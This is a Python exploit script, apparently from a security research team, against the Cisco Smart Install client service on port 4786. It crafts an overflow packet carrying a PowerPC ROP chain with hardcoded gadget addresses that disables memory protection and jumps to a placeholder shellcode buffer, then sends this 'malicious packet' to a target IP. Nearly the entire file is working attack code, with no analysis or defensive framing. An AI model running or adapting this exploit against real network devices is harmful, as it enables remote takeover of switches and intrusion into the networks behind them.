#!/usr/bin/python
# author: dengxun @ 360 A-TEAM

import socket, struct, binascii
from optparse import OptionParser


def craft_tlv(t, v, t_fmt='!I', l_fmt='!I'):
    return struct.pack(t_fmt, t) + struct.pack(l_fmt, len(v)) + v


def send_packet(sock, packet):
    sock.send(packet)


def receive(sock):
    return sock.recv()


if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Smart Install Client", default="172.16.1.1")
    parser.add_option("-p", "--port", dest="port", type="int", help="Port of Client", default=4786)
    (options, args) = parser.parse_args()
    print "[*] Connecting to Smart Install Client on %s:%d" % (options.target, options.port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect((options.target, options.port))

    # payload = 'BBBB' * 44
    # ret = binascii.a2b_hex('050cc7c0')  #c3560 firemare have no asrl, but nx heap
    rop = ''
    rop += 'BBBB'  # $sp + 00 : 0x42424242  #sp1
    rop += binascii.a2b_hex(
        '0117dbbc')  # $sp + 04 : 0x0117dbbc  => [u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
    rop += binascii.a2b_hex('ffffffff')  # $sp + 08 : 0xffffffff  => value for zpr
    rop += binascii.a2b_hex('033ba488')  # $sp + 0c : 0x00000000  => addr for zpr 55555555
    rop += 'BBBB'  # $sp + 10 : 0x42424242  #sp2
    rop += binascii.a2b_hex(
        '01dd3164')  # $sp + 14 : 0x01dd3164  => [u'stw r30, 0(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
    rop += 'B' * 12
    rop += binascii.a2b_hex('02AE13F0')  # $sp + 24 : 0x017BC950  => muti_task mtlr r28 blrl
    rop += 'BBBB' * 5
    rop += binascii.a2b_hex('01ba053c')  # $sp + 34 : 0x01ba053c  => [u'trap', u'blr']

    # payload = 'BBBB' * 9 + ret + 'BBBB' * 34
    payload = 'BBBB' * 2
    payload += 'BBBB'  # r26
    payload += 'BBBB'  # r27
    payload += binascii.a2b_hex('017BC950')  # dep disable
    payload += 'BBBB'  # r29
    payload += 'BBBB'  # r30
    payload += 'BBBB'  # r31
    payload += rop
    payload += 'BBBB' * 20

    shellcode = 'D' * 2048
    data = 'A' * 36 + struct.pack('!I', len(payload) + len(shellcode) + 40) + payload
    tlv_1 = craft_tlv(0x00000001, data)
    print 'size', len(tlv_1)
    tlv_2 = shellcode
    hdr = '\x00\x00\x00\x01'  # msg_from
    hdr += '\x00\x00\x00\x01'  # version
    hdr += '\x00\x00\x00\x07'  # msg_hdr_type
    hdr += struct.pack('>I', len(data))  # data_length

    pkt = hdr + tlv_1 + tlv_2
    # print pkt
    print "[*] Send a malicious packet"
    send_packet(con, pkt)
